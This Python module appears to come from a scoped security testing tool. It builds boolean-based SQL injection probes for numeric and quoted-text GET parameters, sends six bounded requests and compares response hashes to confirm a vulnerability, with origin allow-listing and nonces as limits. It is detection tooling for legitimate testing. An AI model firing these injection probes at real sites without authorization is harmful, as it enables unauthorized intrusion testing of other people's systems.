"""Conservative numeric GET SQLi proof from a browser-observed request.

Six bounded requests compare a stable baseline with two fresh true and false
conditions. A separate actor must repeat the recipe with a different nonce.
"""

from __future__ import annotations

import re
import secrets
from collections.abc import Callable
from urllib.parse import unquote_plus, urlsplit, urlunsplit

from .browser import origin
from .http_observe import observe_get
from .query_probe import plan_observed_query


CHECK_ORDER = ("baseline_first", "true_first", "false_first",
               "true_second", "false_second", "baseline_last")


def plan_numeric_boolean(private_exchange: bytes, *, parameter: str,
                         allowed_origins: list[str]) -> tuple[str, str, str, str]:
    baseline, _ = plan_observed_query(
        private_exchange, parameter=parameter, allowed_origins=allowed_origins,
    )
    parts = urlsplit(baseline)
    fields = parts.query.split("&")
    matches = [index for index, field in enumerate(fields)
               if field and unquote_plus(field.split("=", 1)[0]) == parameter]
    if len(matches) != 1:
        raise ValueError("Numeric parameter must occur exactly once")
    index = matches[0]
    name, separator, raw_value = fields[index].partition("=")
    value = unquote_plus(raw_value) if separator else ""
    if not re.fullmatch(r"[1-9][0-9]{0,8}", value):
        raise ValueError("Boolean SQLi proof requires a positive numeric observed value")
    nonce = str(secrets.randbelow(90000) + 10000)

    def variant(other: int) -> str:
        changed = fields.copy()
        changed[index] = name + "=" + raw_value + "%20AND%20" + nonce + "%3D" + str(other)
        return urlunsplit(parts._replace(query="&".join(changed)))

    return baseline, variant(int(nonce)), variant(int(nonce) + 1), nonce


def plan_text_boolean(private_exchange: bytes, *, parameter: str,
                      allowed_origins: list[str]) -> tuple[str, str, str, str]:
    """Build paired quoted-string conditions from one observed GET field."""
    baseline, _ = plan_observed_query(
        private_exchange, parameter=parameter, allowed_origins=allowed_origins,
    )
    parts = urlsplit(baseline)
    fields = parts.query.split("&")
    matches = [index for index, field in enumerate(fields)
               if field and unquote_plus(field.split("=", 1)[0]) == parameter]
    if len(matches) != 1:
        raise ValueError("Text parameter must occur exactly once")
    index = matches[0]
    name, separator, raw_value = fields[index].partition("=")
    value = unquote_plus(raw_value) if separator else ""
    if not value or len(value) > 80 or re.fullmatch(r"[1-9][0-9]{0,8}", value):
        raise ValueError("Boolean text SQLi proof requires a bounded observed string value")
    nonce = str(secrets.randbelow(90000) + 10000)

    def variant(other: int) -> str:
        changed = fields.copy()
        changed[index] = (
            name + "=" + raw_value + "%27%20AND%20%27"
            + nonce + "%27%3D%27" + str(other)
        )
        return urlunsplit(parts._replace(query="&".join(changed)))

    return baseline, variant(int(nonce)), variant(int(nonce) + 1), nonce


def numeric_sql_proof_valid(result: dict) -> bool:
    if result.get("operation") != "sqli_boolean_numeric" or result.get("proof_recipe") != "numeric_and_boolean_v1":
        return False
    if (result.get("method") != "GET" or result.get("location") != "query"
            or not isinstance(result.get("target"), str) or not result["target"]
            or not isinstance(result.get("parameter"), str) or not result["parameter"]
            or not re.fullmatch(r"[1-9][0-9]{4}", str(result.get("nonce", "")))):
        return False
    checks = result.get("checks")
    if not isinstance(checks, dict) or not all(isinstance(checks.get(key), dict) for key in CHECK_ORDER):
        return False
    rows = [checks[key] for key in CHECK_ORDER]
    if any(row.get("status") != 200 or row.get("truncated") is not False
           or row.get("redirected") is not False
           or not re.fullmatch(r"[0-9a-f]{64}", str(row.get("body_sha256", ""))) for row in rows):
        return False
    if not rows[0].get("content_type") or any(row.get("content_type") != rows[0]["content_type"] for row in rows):
        return False
    hashes = [row["body_sha256"] for row in rows]
    return hashes[0] == hashes[1] == hashes[3] == hashes[5] and hashes[2] == hashes[4] and hashes[2] != hashes[0]


def text_sql_proof_valid(result: dict) -> bool:
    if (result.get("operation") != "sqli_boolean_text"
            or result.get("proof_recipe") != "quoted_text_boolean_v1"):
        return False
    return numeric_sql_proof_valid({
        **result, "operation": "sqli_boolean_numeric",
        "proof_recipe": "numeric_and_boolean_v1",
    })


def probe_numeric_boolean(baseline: str, true_url: str, false_url: str, nonce: str, *,
                          parameter: str, allowed_origins: list[str], storage_state: dict | None,
                          before_request: Callable[[], object]) -> dict:
    urls = (baseline, true_url, false_url, true_url, false_url, baseline)
    checks = {}
    for key, url in zip(CHECK_ORDER, urls, strict=True):
        before_request()
        response = observe_get(url, allowed_origins, storage_state)
        checks[key] = {name: response[name] for name in (
            "status", "content_type", "bytes_captured", "truncated", "body_sha256", "redirected",
        )}
    parts = urlsplit(baseline)
    result = {
        "operation": "sqli_boolean_numeric", "proof_recipe": "numeric_and_boolean_v1",
        "target": origin(baseline) + (parts.path or "/"),
        "method": "GET", "location": "query", "parameter": parameter,
        "nonce": nonce, "requests_sent": 6,
        "identity_transport": "named_identity_cookies_only", "checks": checks,
    }
    result["proof_confirmed"] = numeric_sql_proof_valid(result)
    return result


def probe_text_boolean(baseline: str, true_url: str, false_url: str, nonce: str, *,
                       parameter: str, allowed_origins: list[str], storage_state: dict | None,
                       before_request: Callable[[], object]) -> dict:
    result = probe_numeric_boolean(
        baseline, true_url, false_url, nonce, parameter=parameter,
        allowed_origins=allowed_origins, storage_state=storage_state,
        before_request=before_request,
    )
    result.update(operation="sqli_boolean_text", proof_recipe="quoted_text_boolean_v1")
    result["proof_confirmed"] = text_sql_proof_valid(result)
    return result
